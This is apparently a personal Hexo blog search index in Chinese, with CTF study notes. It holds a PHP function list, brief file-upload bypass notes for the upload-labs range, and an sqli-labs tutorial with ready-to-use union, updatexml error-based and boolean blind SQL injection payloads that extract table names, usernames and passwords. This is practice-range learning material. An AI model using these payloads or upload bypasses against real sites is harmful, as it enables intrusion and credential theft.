<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>做题中遇到的PHP函数</title>
    <link href="/2023/04/24/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84PHP%E5%87%BD%E6%95%B0/"/>
    <url>/2023/04/24/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84PHP%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>遇见过的PHP函数</p><p>1.array_search() 函数</p><pre><code class="hljs">&#123;array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回 false。&#125;array_search(value,array,strict)value必需。规定需要搜素的键值。array必需。规定被搜索的数组。strict可选。如果该参数被设置为 TRUE，则函数在数组中搜索数据类型和值都一致的元素。可能的值： true        false - 默认         如果设置为 true，则在数组中检查给定值的类型，数字 5 和字符串 5 是不同的</code></pre><p>2.PHP foreach 循环</p><pre><code class="hljs">foreach 循环只适用于数组，并用于遍历数组中的每个键/值对。</code></pre><p>语法：foreach ($array as $value) {}<br>        或：foreach($age as $x &#x3D;&gt; $val)</p><p>3.call_user_func_array和call_user_func函数   {调用回调函数，并把一个数组参数作为回调函数的参数}</p><pre><code class="hljs">call_user_func — 把第一个参数作为回调函数调用call_user_func(callable $callback, mixed ...$args): mixed第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</code></pre><p>4.var_dump()：用于输出变量的详细信息，包括值和类型等</p><p>5.preg_match_all()：用于执行一个全局正则表达式匹配</p><p>6.exec()函数基本用法：</p><p>　　　　语法为 exec(string $command[,array &amp;$output[,int &amp;$return_var ]]); </p><p>　　　　$command  为要执行得命令，为字符类型</p><p>　　　　$output  为执行命令后输出的结果，为数组类型</p><p>　　　　$return_var  为命令执行后的返回状态，为int类型</p><p>　　　　理论上只需要一个参数$command即可</p><p>7.empty() 函数</p><pre><code class="hljs">  empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。</code></pre><p>8.file_get_contents() 和file_put_contents()函数</p><pre><code class="hljs">PHP file_get_contents() 函数file_get_contents() 把整个文件读入一个字符串中。file_put_contents() 函数把一个字符串写入文件中</code></pre><p>9.strstr() 函数</p><pre><code class="hljs">strstr() 函数搜索字符串在另一字符串中的第一次出现。strstr(string&#123;被搜索&#125;,search,before_search)</code></pre><p>10.str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。</p><p>11.strrev函数<br>    反转字符串(strrev(“123”)–&gt;321ord)</p><p>12.ord()<br>    返回第一个字母的ASCII</p><p>13.chr()<br>    从指定的ascii值返回字符</p><p>14.str_rot13()<br>    一种编码解码函数<br>      对字符串执行 ROT13 转换,ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函      数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><ol start="15"><li>is_string() 函数<br>is_string() 函数用于检测变量是否是字符串。</li></ol><p>16.isset() 函数<br>    isset() 函数用于检测变量是否已设置并且非 NULL。</p><p>17.eval() 函数把字符串按照 PHP 代码来计算。</p><p>18.intval() 函数<br>    intval() 函数用于获取变量的整数值。<br>    intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生   E_NOTICE 错误并返回 1。</p><ol start="19"><li>scandir() 函数<br>列出 （） 中的文件和目录。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload</title>
    <link href="/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>Pass-01<br>    前端作上传限制，修改或禁用js代码。<br>Pass-02<br>    上传图片马发现成功，burp抓包，修改后缀名，成功。<br>Pass-03<br>    修改木马文件后缀为php3、php5等，需phpd配置文件才能执行php3等文件。<br>Pass-04<br>    htaccess文件结合图片马实现绕过。<br>Pass-05<br>    .user.ini绕过<br>Pass-06<br>    大小写绕过黑名单</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>page</title>
    <link href="/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql靶场</title>
    <link href="/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/"/>
    <url>/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>一、联合注入（页面有信息回显时）</p><pre><code class="hljs">首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合然后通过 ?id=1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）接着通过 ?id=-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）?id=-1&#39;union select 1,database(),3 --+ 得到当前数据库名?id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+（查询当前数据库中所有表的名字）?id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库&#39; and table_name=&#39;表名&#39; --+?id=-1&#39;union select 1,group_concat(username),group_concat(password) from users --+(爆出字段信息)注：初学建议通过分析原码来学习理解注入语句（学习文章 https://blog.csdn.net/elephantxiang/article/details/120091507）</code></pre><p>二、报错注入（）<br>    判断闭合后，直接通过 and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 爆出数据库   </p><pre><code class="hljs">  and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+(爆出表名)and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),1,31),0x7e),1) --+（爆出字段名）and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#39;^&#39;,password)) from users),1,31),0x7e),1) --+（得到信息）注：应学习updatexml（）函数与extractvalue（）函数，截取函数substr（），substr最多能截取32位。</code></pre><p>三、bool盲注</p><pre><code class="hljs">先判断闭合，当页面不会显示信息，但对错页面回显不同时，可以使用bool盲注首先猜测数据库的长度 id=1’ and length(database())=8 --+ascii(substr(database(),1,1))=”ASCII“ --+（通过ASCII码值确定数据库名）and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+（爆表的数量）and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+（变换 x 和 y 的值我们可以得到所有的表名。）?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;表名&quot; limit x,1),y)=&quot;&quot;--+（爆字段名）?id=1&#39; and left((select ‘字段’ from ‘表名’ limit x,1),y)=&quot;&quot;--+（得到数据）注：通过python脚本可以辅助盲注</code></pre><p>四、延时注入</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/19/hello-world/"/>
    <url>/2022/09/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
